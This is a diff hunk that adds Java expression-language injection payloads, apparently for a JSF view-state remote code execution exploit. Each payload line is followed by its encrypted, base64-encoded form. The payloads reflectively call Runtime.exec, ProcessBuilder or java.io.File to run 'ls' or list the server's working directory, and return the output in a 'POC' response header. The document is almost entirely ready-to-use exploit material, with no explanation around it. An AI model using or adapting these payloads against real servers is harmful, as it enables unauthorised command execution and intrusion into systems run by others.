@@ -288,3 +288,14 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGp
 
 payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", \"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).freeMemory())}")
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe705sIPzvBe0UQUu4nlsuSltDbqmJqtm0nF6Rl3TXuaavQz0PJm0XWA3vurg4eQZ/wznzJ5sEKk7icKRNDpQmpMaf//FtPFOCwV8injHY9kLmJY+MOLdvxM7qVO/DRd+LghgWm/H8LmPUD
+
+zzzz
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", \"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"ls \" + \"\".getClass().forName(\"java.lang.System\").getMethod(\"getProperty\", \"\".getClass()).invoke(null, \"user.dir\")).getInputStream().readAllBytes())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZIkoWzQd/CtzmFrMHGC3FW5iulcoSYVaJ+rEu+94NJu539Jj92oQ6h5x6IO9SEb/Cklv/a10PAq5YS9LFgj17qT5NJgd2RI6/yp2W+pnqcBFNogqRCwGqQls9fEQ+gq7jyKFt4P4cKf3abjupg+fn2puJ/00QpjNEhUBuvzYpwup3pkIgMouK1VLHn3+oRVS2HTmbCkFWUmPkKTLmyWi1a2paZArBAY1i62BjBN9U+HMTRO7QWpR5m5Ct+y8lyKHz3jfFwz5KoBNpazE+zWiVpPjRsMr5tsEPBqebFIB4BLdpJjLhN0MOr+UwM5/dDc5w=
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", \"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructor(\"\".getClass()).newInstance(\"ls\", \"\".getClass().forName(\"java.lang.System\").getMethod(\"getProperty\", \"\".getClass()).invoke(null, \"user.dir\"))).start().getInputStream().readAllBytes())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZIkoWzQd/CtzmFrMHGC3FW5iulcoSYVaJ+rEu+94NJu8FT2PFuCb/LjumFiugg36nRzIwGWb/lOlhyfqz8vQKUaFxEp5o1hemicf/IDpqoRe5prJTGtXM42BpmNRkgrRN34NsPNUkkHnh1Fe5Uri0D1h120HVoYm/mME9cVewWF27Bp94ikUCzZjfqL0LL135BuWILDgx8B7dKXlDTf0FNwMTT0KNP9/aBHNA2oPGlBzRLTGzAIlCudbcjqigO72KhkGedsg+NmMkGdjYuJ/C/nto/VxBxDT/5tBwkwaawm2EhicwGB14jV93yccMP0j1SW1x/a1jxPGJSTmBmqvgx
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().forName(\"java.io.File\").getConstructor(\"\".getClass()).newInstance(\"\".getClass().forName(\"java.lang.System\").getMethod(\"getProperty\", \"\".getClass()).invoke(null, \"user.dir\")).list())))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf9RbkalWJkapsN77q/Q8flJzTc9d1mQH0SzzXYO8suUZGCtaHm89JO3ZSdTaPFODuk+Kr/RnJKS+iAX0eHzb18Dudz0Tq6fXisfExzhP7xYV5Us8dmpDnbNvqQgZ1+KxkpZ/5xQHZF2xcp9BX0Y6nJmspVQX0rqcEWCUBBGwBs/ePRptLvF82TODEmc5y7gCVhfFkHoNszA62voAzkJnND0Ax98yypMJTMghWK5e7Ivwt7gx0vspKdKkH5/MPKQisD
